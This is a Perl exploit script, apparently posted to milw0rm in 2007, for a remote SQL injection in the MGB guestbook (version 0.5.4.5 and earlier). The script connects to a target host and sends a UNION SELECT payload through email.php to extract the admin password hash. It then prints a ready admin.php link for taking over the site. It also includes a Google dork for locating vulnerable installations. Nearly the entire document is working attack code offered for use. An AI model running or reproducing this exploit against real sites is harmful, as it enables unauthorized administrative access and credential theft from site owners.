#!/usr/bin/perl
#
##########################################################
# MGB <= 0.5.4.5 Exploit
# Vulnerability found by SlimTim10
# Created By: SlimTim10
# <slimtim10@gmail.com>
##########################################################
# Google dork:
# ( intext:mgb.0.5.. & intext:mopzz ) | intext:mgb.0.5.4..
##########################################################


use IO::Socket::INET;

usage() unless (@ARGV == 2);

$host = $ARGV[0];
$dir = $ARGV[1];

$dir = "\/$dir" if ($dir !~ /^\//);
$dir = "$dir\/" if ($dir !~ /\/$/);
$host =~ s/http:\/\///g;

$path = $dir.'email.php?id=1%20UNION%20SELECT%20null,passwort%20FROM%20mgb_settings%20--';
$socket = IO::Socket::INET->new( Proto => "tcp",
								 PeerAddr => "$host",
								 PeerPort => "80")
								 || die "[-]Connect Failed: could not connect to $host\n";

print "[+]Connecting...\n";
print $socket "GET $path HTTP/1.1\n";
print $socket "Host: $host\n";
print $socket "Accept: */*\n";
print $socket "Connection: close\n\n";
print "[+]Connected!\n";

while ($answer = <$socket>) {
  $answer =~ m/Email an&nbsp;(.*?)&nbsp;schreiben/ and $var = $1;
}

if ($var !~ /[\da-f]{32,32}/) {
	print "[-]Exploit failed.";
	exit(0);
}

print "[+]Admin Password: $var\n";
print "[+]Admin Link: http://$host".$dir."admin.php?sid=$var\n";

sub usage {
    print "\n" . "=|=-" x 14 . "=|=";
    print q(
]                                                         [
[       MGB <= 0.5.4.5 Remote SQL Injection Exploit       ]
[                Tested on MGB <= 0.5.4.5                 ]
[       Created by: SlimTim10 <slimtim10@gmail.com>       ]
]                                                         [
);
    print "=|=-" x 14 . "=|=\n\n";
    print "\tUsage: $0 [HOST] [PATH]\n";
    print "\tEx: $0 www.host.com /guestbook/\n";
    print "\tEx: $0 host.com mgb";
    print "\n\n"."`^" x 29 . "`\n";
    exit(0);
}

# milw0rm.com [2007-01-17]